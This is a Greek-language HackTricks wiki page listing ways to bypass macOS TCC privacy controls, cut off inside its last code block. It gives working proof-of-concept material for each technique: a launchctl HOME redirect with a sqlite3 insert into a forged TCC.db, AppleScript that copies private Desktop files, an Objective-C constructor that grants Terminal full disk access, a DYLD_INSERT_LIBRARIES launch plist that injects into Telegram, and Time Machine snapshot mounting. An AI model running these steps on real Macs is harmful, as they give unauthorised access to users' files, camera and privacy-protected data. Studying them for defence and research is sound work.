# macOS TCC Bypasses

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Ειδικός Red Team του HackTricks στο AWS)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα τηλεγραφήματος**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

## Ανά λειτουργικότητα

### Παράκαμψη Εγγραφής

Αυτό δεν είναι μια παράκαμψη, απλώς είναι πώς λειτουργεί το TCC: **Δεν προστατεύει από την εγγραφή**. Αν ο Τερματικός **δεν έχει πρόσβαση για να διαβάσει την επιφάνεια εργασίας ενός χρήστη, μπορεί ακόμα να γράψει μέσα σε αυτήν**:

```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```

Το **επεκτεινόμενο χαρακτηριστικό `com.apple.macl`** προστίθεται στο νέο **αρχείο** για να δώσει πρόσβαση στην **εφαρμογή δημιουργού** να το διαβάσει.

### TCC ClickJacking

Είναι δυνατόν να **τοποθετηθεί ένα παράθυρο πάνω από την προτροπή TCC** για να κάνει ο χρήστης **αποδοχή** χωρίς να το παρατηρήσει. Μπορείτε να βρείτε ένα PoC στο [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)**.**

<figure><img src="https://github.com/carlospolop/hacktricks/blob/gr/macos-hardening/macos-security-and-privilege-escalation/macos-security-protections/macos-tcc/macos-tcc-bypasses/broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### TCC Αίτηση με αυθαίρετο όνομα

Ο επιτιθέμενος μπορεί να **δημιουργήσει εφαρμογές με οποιοδήποτε όνομα** (π.χ. Finder, Google Chrome...) στο **`Info.plist`** και να του ζητήσει πρόσβαση σε κάποια προστατευμένη τοποθεσία TCC. Ο χρήστης θα νομίζει ότι η γνήσια εφαρμογή είναι αυτή που ζητά αυτήν την πρόσβαση.\
Επιπλέον, είναι δυνατόν να **αφαιρέσετε τη γνήσια εφαρμογή από την Dock και να τοποθετήσετε τη ψεύτικη**, έτσι ώστε όταν ο χρήστης κάνει κλικ στη Ϩεύτικη (η οποία μπορεί να χρησιμοποιεί το ίδιο εικονίδιο) μπορεί να καλέσει τη γνήσια, να ζητήσει άδειες TCC και να εκτελέσει malware, κάνοντας τον χρήστη να πιστέψει ότι η γνήσια εφαρμογή ζήτησε την πρόσβαση.

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

Περισσότερες πληροφορίες και PoC σε:

{% content-ref url="../../../macos-privilege-escalation.md" %}
[macos-privilege-escalation.md](../../../macos-privilege-escalation.md)
{% endcontent-ref %}

### Παράκαμψη SSH

Από προεπιλογή, η πρόσβαση μέσω **SSH είχε "Πλήρη Πρόσβαση Δίσκου"**. Για να απενεργοποιήσετε αυτό, πρέπει να είναι καταχωρισμένο αλλά απενεργοποιημένο (η αφαίρεσή του από τη λίστα δεν θα αφαιρέσει αυτές τις προνομιακές πρόσβασεις):

![](<../../../../../.gitbook/assets/image (569).png>)

Εδώ μπορείτε να βρείτε παραδείγματα πώς μερικά **κακόβουλα προγράμματα έχουν καταφέρει να παρακάμψουν αυτήν την προστασία**:

* [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)

{% hint style="danger" %}
Σημειώστε ότι τώρα, για να είστε σε θέση να ενεργοποιήσετε το SSH, χρειάζεστε **Πλήρη Πρόσβαση Δίσκου**
{% endhint %}

### Χειρισμός επεκτάσεων - CVE-2022-26767

Το χαρακτηριστικό **`com.apple.macl`** δίνεται σε αρχεία για να δώσει σε μια **συγκεκριμένη εφαρμογή δικαιώματα για να το διαβάσει.** Αυτό το χαρακτηριστικό ορίζεται όταν ο χρήστης **σύρει και αφήνει** ένα αρχείο πάνω από μια εφαρμογή, ή όταν ένας χρήστης **κάνει διπλό κλικ** σε ένα αρχείο για να το ανοίξει με τη **βασική εφαρμογή**.

Επομένως, ένας χρήστης θα μπορούσε να **καταχωρίσει μια κακόβουλη εφαρμογή** για να χειριστεί όλες τις επεκτάσεις και να καλέσει τις Υπηρεσίες Εκκίνησης για να **ανοίξει** οποιοδήποτε αρχείο (έτσι το κακόβουλο αρχείο θα έχει πρόσβαση να το διαβάσει).

### iCloud

Το δικαίωμα **`com.apple.private.icloud-account-access`** είναι δυνατό να επικοινωνήσει με την υπηρεσία XPC **`com.apple.iCloudHelper`** η οποία θα **παρέχει τα tokens του iCloud**.

**Το iMovie** και το **Garageband** είχαν αυτό το δικαίωμα και άλλα που επιτρέπονταν.

Για περισσότερες **πληροφορίες** σχετικά με την εκμετάλλευση για την **απόκτηση των tokens του iCloud** από αυτό το δικαίωμα, ελέγξτε την ομιλία: [**#OBTS v5.0: "Τι συμβαίνει στο Mac σας, Μένει στο iCloud της Apple;!" - Wojciech Regula**](https://www.youtube.com/watch?v=\_6e2LhmxVc0)

### kTCCServiceAppleEvents / Αυτοματισμός

Μια εφαρμογή με το δικαίωμα **`kTCCServiceAppleEvents`** θα μπορεί να **ελέγχει άλλες εφαρμογές**. Αυτό σημαίνει ότι θα μπορούσε να **καταχραστεί τις άδειες που έχουν δοθεί στις άλλες εφαρμογές**.

Για περισσότερες πληροφορίες σχετικά με τα Apple Scripts, ελέγξτε:

{% content-ref url="macos-apple-scripts.md" %}
[macos-apple-scripts.md](macos-apple-scripts.md)
{% endcontent-ref %}

Για παράδειγμα, αν μια εφαρμογή έχει **Άδεια Αυτοματισμού πάνω από το `iTerm`**, για παράδειγμα σε αυτό το παράδειγμα το **`Terminal`** έχει πρόσβαση στο iTerm:

<figure><img src="../../../../../.gitbook/assets/image (2) (2) (1).png" alt=""><figcaption></figcaption></figure>

#### Πάνω στο iTerm

Το Terminal, που δεν έχει Πλήρη Πρόσβαση Δίσκου, μπορεί να καλέσει το iTerm, που την έχει, και να το χρησιμοποιήσει για να εκτελέσει ενέργειες:

{% code title="iterm.script" %}
```applescript
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```
{% endcode %}

```bash
osascript iterm.script
```

#### Πάνω από το Finder

Ή αν μια εφαρμογή έχει πρόσβαση πάνω από το Finder, μπορεί να εκτελέσει ένα σενάριο όπως το παρακάτω:

```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```

## Με βάση τη συμπεριφορά της εφαρμογής

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

Το **δαίμονα tccd** του χρήστη χρησιμοποιεί τη μεταβλητή περιβάλλοντος **`HOME`** για να έχει πρόσβαση στη βάση δεδομένων χρηστών TCC από: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

Σύμφωνα με [αυτήν τη δημοσίευση στο Stack Exchange](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686) και επειδή το δαίμονα TCC τρέχει μέσω `launchd` εντός του τρέχοντος τομέα χρήστη, είναι δυνατό να **ελέγχεται όλες τις μεταβλητές περιβάλλοντος** που περνούν σε αυτόν.\
Έτσι, ένας **επιτιθέμενος θα μπορούσε να ορίσει τη μεταβλητή περιβάλλοντος `$HOME`** στο **`launchctl`** ώστε να δείχνει σε ένα **ελεγχόμενο κατάλογο**, **επανεκκινήσει** το **δαίμονα TCC**, και στη συνέχεια **να τροποποιήσει απευθείας τη βάση δεδομένων TCC** για να δώσει στον εαυτό του **κάθε δικαίωμα TCC που είναι διαθέσιμο** χωρίς ποτέ να ζητήσει άδεια από τον τελικό χρήστη.\
PoC:

```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```

### CVE-2021-30761 - Σημειώσεις

Οι Σημειώσεις είχαν πρόσβαση σε προστατευμένες τοποθεσίες TCC, αλλά όταν δημιουργείται μια σημείωση αυτή δημιουργείται σε μια **μη προστατευμένη τοποθεσία**. Έτσι, θα μπορούσατε να ζητήσετε από τις Σημειώσεις να αντιγράψουν ένα προστατευμένο αρχείο σε μια σημείωση (σε μια μη προστατευμένη τοποθεσία) και στη συνέχεια να έχετε πρόσβαση στο αρχείο:

<figure><img src="../../../../../.gitbook/assets/image (6) (1) (3).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Μετακίνηση

Το δυαδικό `/usr/libexec/lsd` με τη βιβλιοθήκη `libsecurity_translocate` είχε το entitlement `com.apple.private.nullfs_allow` το οποίο του επέτρεπε να δημιουργήσει **nullfs** mount και είχε το entitlement `com.apple.private.tcc.allow` με **`kTCCServiceSystemPolicyAllFiles`** για πρόσβαση σε κάθε αρχείο.

Ήταν δυνατόν να προστεθεί το χαρακτηριστικό καραντίνας στο "Library", να κληθεί το XPC service **`com.apple.security.translocation`** και στη συνέχεια να αντιστοιχιστεί το Library στο **`$TMPDIR/AppTranslocation/d/d/Library`** όπου όλα τα έγγραφα μέσα στο Library θα μπορούσαν να **προσπελαστούν**.

### CVE-2023-38571 - Μουσική & Τηλεόραση <a href="#cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv" id="cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv"></a>

Η **`Μουσική`** έχει ένα ενδιαφέρον χαρακτηριστικό: Όταν εκτελείται, θα **εισάγει** τα αρχεία που αποθέτονται στο **`~/Μουσική/Μουσική/Μέσα.localized/Αυτόματη Προσθήκη στην Μουσική.localized`** στη "βιβλιοθήκη πολυμέσων" του χρήστη. Επιπλέον, καλεί κάτι σαν: **`rename(a, b);`** όπου `a` και `b` είναι:

* `a = "~/Μουσική/Μουσική/Μέσα.localized/Αυτόματη Προσθήκη στην Μουσική.localized/myfile.mp3"`
* `b = "~/Μουσική/Μουσική/Μέσα.localized/Αυτόματη Προσθήκη στην Μουσική.localized/Μη Προστέθηκε.localized/2023-09-25 11.06.28/myfile.mp3`

Αυτή η συμπεριφορά **`rename(a, b);`** είναι ευάλωτη σε μια **Συνθήκη Αγώνα**, καθώς είναι δυνατόν να τεθεί μέσα στον φάκελο `Αυτόματη Προσθήκη στην Μουσική.localized` ένα ψεύτικο αρχείο **TCC.db** και στη συνέχεια, όταν δημιουργείται ο νέος φάκελος (b) να αντιγραφεί το αρχείο, να διαγραφεί και να κατευθυνθεί προς **`~/Βιβλιοθήκη/Υποστήριξη Εφαρμογών/com.apple.TCC`**/.

### SQLITE\_SQLLOG\_DIR - CVE-2023-32422

Αν **`SQLITE_SQLLOG_DIR="διαδρομή/φάκελος"`** σημαίνει βασικά ότι **κάθε ανοιχτή βάση δεδομένων αντιγράφεται σε αυτήν τη διαδρομή**. Σε αυτό το CVE αυτός ο έλεγχος καταχράστηκε για να **γράψει** μέσα σε μια **βάση δεδομένων SQLite** που θα ανοιχτεί από ένα διεργασία με FDA τη βάση δεδομένων TCC, και στη συνέχεια να καταχραστεί το **`SQLITE_SQLLOG_DIR`** με ένα **σύμβολο σύνδεσης στο όνομα αρχείου** έτσι ώστε όταν αυτή η βάση δεδομένων είναι **ανοιχτή**, η βάση δεδομένων του χρήστη **TCC.db αντικαθίσταται** με αυτή που άνοιξε.\
**Περισσότερες πληροφορίες** [**στο άρθρο**](https://gergelykalman.com/sqlol-CVE-2023-32422-a-macos-tcc-bypass.html) **και** [**στην ομιλία**](https://www.youtube.com/watch?v=f1HA5QhLQ7Y\&t=20548s).

### **SQLITE\_AUTO\_TRACE**

Εάν η μεταβλητή περιβάλλοντος **`SQLITE_AUTO_TRACE`** είναι ορισμένη, η βιβλιοθήκη **`libsqlite3.dylib`** θα αρχίσει να **καταγράφει** όλα τα ερωτήματα SQL. Πολλές εφαρμογές χρησιμοποιούσαν αυτήν τη βιβλιοθήκη, οπότε ήταν δυνατόν να καταγραφούν όλα τα ερωτήματα τους SQLite.

Πολλές εφαρμογές της Apple χρησιμοποιούσαν αυτήν τη βιβλιοθήκη για να έχουν πρόσβαση σε προστατευμένες πληροφορίες TCC.

```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```

### MTL\_DUMP\_PIPELINES\_TO\_JSON\_FILE - CVE-2023-32407

Αυτή η **μεταβλητή περιβάλλοντος χρησιμοποιείται από το πλαίσιο `Metal`** το οποίο είναι μια εξάρτηση από διάφορα προγράμματα, κυρίως το `Music`, το οποίο έχει FDA.

Με την ρύθμιση: `MTL_DUMP_PIPELINES_TO_JSON_FILE="διαδρομή/όνομα"`. Αν η `διαδρομή` είναι έγκυρος κατάλογος, το σφάλμα θα ενεργοποιηθεί και μπορούμε να χρησιμοποιήσουμε το `fs_usage` για να δούμε τι συμβαίνει στο πρόγραμμα:

* θα ανοίξει ένα αρχείο, με όνομα `path/.dat.nosyncXXXX.XXXXXX` (το Χ είναι τυχαίο)
* ένας ή περισσότεροι `write()` θα γράψουν τα περιεχόμενα στο αρχείο (δεν έχουμε έλεγχο επί του θέματος)
* το `path/.dat.nosyncXXXX.XXXXXX` θα μετονομαστεί σε `path/name`

Πρόκειται για μια προσωρινή εγγραφή αρχείου, ακολουθούμενη από μια **`rename(old, new)`** **η οποία δεν είναι ασφαλής.**

Δεν είναι ασφαλές επειδή πρέπει **να επιλύσει τις παλιές και νέες διαδρομές ξεχωριστά**, κάτι που μπορεί να πάρει χρόνο και να είναι ευάλωτο σε έναν Ανταγωνισμό Κατάστασης. Για περισσότερες πληροφορίες μπορείτε να ελέγξετε τη λειτουργία `xnu` `renameat_internal()`.

{% hint style="danger" %}
Ουσιαστικά, αν ένα προνομιούχο διεργασία μετονομάζει από ένα φάκελο που ελέγχετε, θα μπορούσατε να κερδίσετε ένα RCE και να τον κάνετε να έχει πρόσβαση σε ένα διαφορετικό αρχείο ή, όπως σε αυτό το CVE, να ανοίξετε το αρχείο που δημιούργησε το προνομιούχο πρόγραμμα και να αποθηκεύσετε ένα FD.

Αν η μετονομασία προσπερνά ένα φάκελο που ελέγχετε, ενώ έχετε τροποποιήσει το πηγαίο αρχείο ή έχετε ένα FD σε αυτό, μπορείτε να αλλάξετε το αρχείο (ή τον φάκελο) προορισμού για να δείχνει σε ένα σύμβολο σύνδεσης, έτσι ώστε να μπορείτε να γράψετε όποτε θέλετε.
{% endhint %}

Αυτή ήταν η επίθεση στο CVE: Για παράδειγμα, για να αντικαταστήσετε τη βάση δεδομένων χρήστη `TCC.db`, μπορείτε:

* δημιουργήστε `/Users/hacker/ourlink` για να δείχνει στο `/Users/hacker/Library/Application Support/com.apple.TCC/`
* δημιουργήστε τον κατάλογο `/Users/hacker/tmp/`
* ορίστε `MTL_DUMP_PIPELINES_TO_JSON_FILE=/Users/hacker/tmp/TCC.db`
* ενεργοποιήστε το σφάλμα εκτελώντας το `Music` με αυτήν τη μεταβλητή περιβάλλοντος
* πιάστε το `open()` του `/Users/hacker/tmp/.dat.nosyncXXXX.XXXXXX` (το Χ είναι τυχαίο)
* εδώ επίσης κάνουμε `open()` αυτό το αρχείο για εγγραφή και κρατάμε τον αναγνωριστικό αρχείου
* ατομικά αλλάξτε το `/Users/hacker/tmp` με το `/Users/hacker/ourlink` **σε ένα βρόχο**
* κάνουμε αυτό για να μεγιστοποιήσουμε τις πιθανότητές μας για επιτυχία καθώς το παράθυρο ανταγωνισμού είναι αρκετά στενό, αλλά η απώλεια του αγώνα έχει αμελητέα αρνητική πλευρά
* περιμένουμε λίγο
* ελέγχουμε αν τα καταφέραμε
* αν όχι, εκτελέστε ξανά από την αρχή

Περισσότερες πληροφορίες στο [https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html](https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html)

{% hint style="danger" %}
Τώρα, αν προσπαθήσετε να χρησιμοποιήσετε τη μεταβλητή περιβάλλοντος `MTL_DUMP_PIPELINES_TO_JSON_FILE` τα προγράμματα δεν θα εκκινήσουν
{% endhint %}

### Apple Remote Desktop

Ως ροοτ μπορείτε να ενεργοποιήσετε αυτήν την υπηρεσία και ο **ARD agent θα έχει πλήρη πρόσβαση στο δίσκο** που στη συνέχεια μπορεί να καταχραστεί από έναν χρήστη για να τον κάνει να αντιγράψει μια νέα **βάση δεδομένων χρήστη TCC**.

## Με το **NFSHomeDirectory**

Το TCC χρησιμοποιεί μια βάση δεδομένων στον ΦΑΚΕΛΟ ΑΡΧΙΚΟΥ του χρήστη για να ελέγχει την πρόσβαση σε πόρους που είναι συγκεκριμένοι για τον χρήστη στο **$HOME/Library/Application Support/com.apple.TCC/TCC.db**.\
Επομένως, αν ο χρήστης καταφέρει να επανεκκινήσει το TCC με μια μεταβλητή περιβάλλοντος $HOME που δείχνει σε ένα **διαφορετικό φάκελο**, ο χρήστης θα μπορούσε να δημιουργήσει μια νέα βάση δεδομένων TCC στο **/Library/Application Support/com.apple.TCC/TCC.db** και να εξαπατήσει το TCC για να χορηγήσει οποιαδήποτε άδεια TCC σε οποιαδήποτε εφαρμογή.

{% hint style="success" %}
Σημειώστε ότι η Apple χρησιμοποιεί τη ρύθμιση που αποθηκεύεται μέσα στο προφίλ του χρήστη στο χαρακτηριστικό **`NFSHomeDirectory`** για την **τιμή του `$HOME`**, οπότε αν διαρρεύσετε μια εφαρμογή με δικαιώματα να τροποποιήσει αυτήν την τιμή (**`kTCCServiceSystemPolicySysAdminFiles`**), μπορείτε να **ενοποιήσετε** αυτήν την επιλογή με ένα παράκαμψη TCC.
{% endhint %}

### [CVE-2020–9934 - TCC](./#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](./#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

Το **πρώτο POC** χρησιμοποιεί τα [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) και [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) για να τροποποιήσει τον ΦΑΚΕΛΟ ΑΡΧΙΚΟΥ του χρήστη.

1. Λάβετε ένα _csreq_ blob για τη στόχο εφαρμογή.
2. Φυτέψτε ένα ψεύτικο αρχείο _TCC.db_ με την απαιτούμενη πρόσβαση και το _csreq_ blob.
3. Εξαγάγετε την εγγραφή υπηρεσιών καταλόγου του χρήστη με το [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/).
4. Τροποποιήστε την εγγραφή υπηρεσιών καταλόγου για να αλλάξετε τον κατάλογο αρχικού του χρήστη.
5. Εισαγάγετε την τροποποιημένη εγγραφή υπηρεσιών καταλόγου με το [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/).
6. Διακόψτε το _tccd_ του χρήστη και επανεκκινήστε τη διαδικασία.

Το δεύτερο POC χρησιμοποίησε το **`/usr/libexec/configd`** το οποίο είχε `com.apple.private.tcc.allow` με την τιμή `kTCCServiceSystemPolicySysAdminFiles`.\
Ήταν δυνατό να εκτελεστεί το **`configd`** με την επιλογή **`-t`**, όπου ένας επιτιθέμενος θα μπορούσε να καθορίσει ένα **προσαρμοσμένο Bundle για φόρτωση**. Επομένως, η εκμετάλλευση **αντικαθιστά** τη μέθοδο **`dsexport`** και **`dsimport`** για την αλλαγή του καταλόγου αρχικού του χρήστη με μια **ενσωμάτωση κώδικα configd**.

Για περισσότερες πληροφορίες ελέγξτε την \[**αρχική αναφορά**]\(https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user

### CVE-2020-29621 - Coreaudiod

Το δυαδικό **`/usr/sbin/coreaudiod`** είχε τα entitlements `com.apple.security.cs.disable-library-validation` και `com.apple.private.tcc.manager`. Το πρώτο επιτρέπει την **εισαγωγή κώδικα** και το δεύτερο του δίνει πρόσβαση για **διαχείριση του TCC**.

Αυτό το δυαδικό επέτρεπε τη φόρτωση **plug-ins τρίτων** από τον φάκελο `/Library/Audio/Plug-Ins/HAL`. Επομένως, ήταν δυνατό να **φορτωθεί ένα πρόσθετο και να καταχραστούν οι άδειες του TCC** με αυτό το PoC:

```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```

Για περισσότερες πληροφορίες ελέγξτε την [**αρχική αναφορά**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/).

### Προσθήκες Επιπέδου Αφαίρεσης Συσκευής (Device Abstraction Layer - DAL)

Οι εφαρμογές συστήματος που ανοίγουν ροή κάμερας μέσω του Core Media I/O (εφαρμογές με **`kTCCServiceCamera`**) φορτώνουν **σε αυτή τη διαδικασία αυτά τα πρόσθετα** που βρίσκονται στο `/Library/CoreMediaIO/Plug-Ins/DAL` (χωρίς περιορισμούς SIP).

Απλά αποθηκεύοντας εκεί ένα βιβλιοθήκη με τον κοινό **constructor** θα λειτουργήσει για τη **ενσωμάτωση κώδικα**.

Πολλές εφαρμογές της Apple ήταν ευάλωτες σε αυτό.

### Firefox

Η εφαρμογή Firefox είχε τα entitlements `com.apple.security.cs.disable-library-validation` και `com.apple.security.cs.allow-dyld-environment-variables`:

```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```

Για περισσότερες πληροφορίες σχετικά με το πώς να εκμεταλλευτείτε εύκολα αυτό, [**ελέγξτε την αρχική αναφορά**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).

### CVE-2020-10006

Το δυαδικό αρχείο `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` είχε τα entitlements **`com.apple.private.tcc.allow`** και **`com.apple.security.get-task-allow`**, τα οποία επέτρεπαν την ενσωμάτωση κώδικα μέσα στη διαδικασία και τη χρήση των προνομίων TCC.

### CVE-2023-26818 - Telegram

Το Telegram είχε τα entitlements **`com.apple.security.cs.allow-dyld-environment-variables`** και **`com.apple.security.cs.disable-library-validation`**, οπότε ήταν δυνατό να το καταχραστείτε για να **αποκτήσετε πρόσβαση στα δικαιώματά του** όπως η εγγραφή με την κάμερα. Μπορείτε να [**βρείτε το φορτίο στην ανάλυση**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).

Σημειώστε πώς να χρησιμοποιήσετε τη μεταβλητή περιβάλλοντος για να φορτώσετε ένα βιβλιοθήκη ένα **προσαρμοσμένο plist** δημιουργήθηκε για να ενσωματώσει αυτή τη βιβλιοθήκη και ο **`launchctl`** χρησιμοποιήθηκε για να την εκκινήσει:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```

## Με ανοιχτές κλήσεις

Είναι δυνατόν να γίνει κλήση στην **`open`** ακόμα και όταν είναι σε λειτουργία αμμόλογης

### Σενάρια τερματικού

Είναι αρκετά συνηθισμένο να δίνεται πρόσβαση **Πλήρους Πρόσβασης Δίσκου (FDA)** στο τερματικό, τουλάχιστον σε υπολογιστές που χρησιμοποιούνται από τεχνικά άτομα. Και είναι δυνατόν να γίνει κλήση σε σενάρια **`.terminal`** χρησιμοποιώντας το.

Τα σενάρια **`.terminal`** είναι αρχεία plist όπως το παρακάτω με την εντολή που θα εκτελεστεί στο κλειδί **`CommandString`**:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```

Μια εφαρμογή θα μπορούσε να γράψει ένα σενάριο τερματικού σε έναν τόπο όπως το /tmp και να το εκκινήσει με ένα ερώτημα όπως:

```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```

## Με την προσάρτηση

### CVE-2020-9771 - παράκαμψη TCC του mount\_apfs και ανύψωση προνομίων

**Οποιοσδήποτε χρήστης** (ακόμα και μη προνομιούχος) μπορεί να δημιουργήσει και να προσαρτήσει ένα αντίγραφο ασφαλείας του Time Machine και **να έχει πρόσβαση ΣΕ ΟΛΑ τα αρχεία** αυτού του αντιγράφου ασφαλείας.\
Τα **μόνα προνομία** που χρειάζονται είναι για την εφαρμογή που χρησιμοποιείται (όπως το `Terminal`) να έχει **Πλήρη Πρόσβαση Δίσκου** (FDA) (`kTCCServiceSystemPolicyAllfiles`) η οποία πρέπει να χορηγηθεί από έναν διαχειριστή.

{% code overflow="wrap" %}
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
